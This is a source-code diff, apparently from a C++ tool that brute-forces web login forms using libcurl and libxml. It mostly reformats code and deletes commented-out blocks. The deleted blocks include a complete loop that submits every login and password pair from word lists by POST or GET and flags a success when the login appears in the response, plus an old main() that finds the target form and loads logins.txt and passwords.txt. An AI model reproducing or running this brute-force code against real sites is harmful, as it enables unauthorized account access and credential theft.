@@ -13,10 +13,10 @@ using namespace std;
 
 struct Context{
 	Context(): containsForm(false) { }
-    const xmlChar* formMethod = NULL;
-    const xmlChar* login = NULL;
-    const xmlChar* password = NULL;
-    const xmlChar* action = NULL;
+	const xmlChar* formMethod = NULL;
+	const xmlChar* login = NULL;
+	const xmlChar* password = NULL;
+	const xmlChar* action = NULL;
 	bool containsForm;
 } form;
 
@@ -301,31 +301,6 @@ static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passw
 		}
 	}
 	cout<<"There is no login or password correspondance \n";
-	/*while(getline(&login, &lenLogin, loginDescr)  != -1){
-		printf("login = %s \n", login);
-		while(getline(&password, &lenPassword, passwordDescr)  != -1){
-			data = concat(form.login, login, form.password, password);
-			if(!strcasecmp((char*)form.formMethod, "post")){
-				curl_easy_setopt(conn, CURLOPT_POSTFIELDS, data);
-			} else if(!strcasecmp((char*)form.formMethod, "get")){
-				curl_easy_setopt(conn, CURLOPT_URL,  data);
-			}
-			free(data);
-			res = curl_easy_perform(conn);
-			if(res != CURLE_OK){
-				fprintf(stderr, "curl_easy_perform() failed: %s\n",
-				curl_easy_strerror(res));
-			}
-			//Check if login exists inside replied page, if found one probably you logged int
-			if(strstr(buffer.c_str(), login) != NULL){
-				printf("Congradulation you have logged in\n");
-				printf("Login =%s, Password = %s \n", login, password);
-				break;
-			}
-		}
-		fseek(passwordDescr, 0, SEEK_SET);
-	}
-	perror("There were no corresponding  login and password \n");*/
 }
 
 bool startAttack(string& hostName, list<string>& logins, list<string>& passwords){
@@ -338,7 +313,6 @@ bool startAttack(string& hostName, list<string>& logins, list<string>& passwords
 	}
 
 	// Retrieve content for the URL
-	//printf("hostName = %s \n", (char*)host);
 	code = curl_easy_perform(conn);
 
 	if (code != CURLE_OK) {
@@ -365,70 +339,3 @@ bool startAttack(string& hostName, list<string>& logins, list<string>& passwords
 	bruteForceLoginAndPassword(logins, passwords, form, conn);
 }
 
-/*int main(int argc, char *argv[]) {
-	CURL *conn = NULL;
-	FILE *loginDescr = NULL;
-	FILE *passwordDescr = NULL;
-	CURLcode code;
-	
-	// Ensure one argument is given
-	if (argc != 2){
-		fprintf(stderr, "Usage: %s <url>\n", argv[0]);
-
-		exit(EXIT_FAILURE);
-	}
-
-	// Initialize CURL connection
-
-	if (!init(conn, argv[1])){
-		fprintf(stderr, "Connection initializion failed\n");
-
-		exit(EXIT_FAILURE);
-	}
-	
-	// Retrieve content for the URL
-
-	code = curl_easy_perform(conn);
-
-	if (code != CURLE_OK) {
-		fprintf(stderr, "Failed to get '%s' [%s]\n", argv[1], errorBuffer);
-
-		exit(EXIT_FAILURE);
-	}
-
-	// Parse the (assumed) HTML code
-
-	parseHtml(buffer);
-
-	if(!form.containsForm){
-		fprintf(stderr, "There is no form in the given page \n");
-
-		exit(EXIT_FAILURE);
-	}
-
-	if(!form.login || !form.password){
-		fprintf(stderr, "There no login or password field \n");
-
-		exit(EXIT_FAILURE);
-	}
-
-	loginDescr = fopen("logins.txt", "r");
-
-	if(loginDescr == NULL){
-		perror("Error opening file containing logins");
-		return(-1);
-	}
-
-	passwordDescr = fopen("passwords.txt", "r");
-	if(passwordDescr == NULL){
-		perror("Error opening file containing passwords");
-		return(-1);
-	}
-	
-	bruteForceLoginAndPassword(loginDescr, passwordDescr, form, conn);
-
-	fclose(loginDescr);
-	fclose(passwordDescr);
-	curl_easy_cleanup(conn);
-	return EXIT_SUCCESS;
-}*/
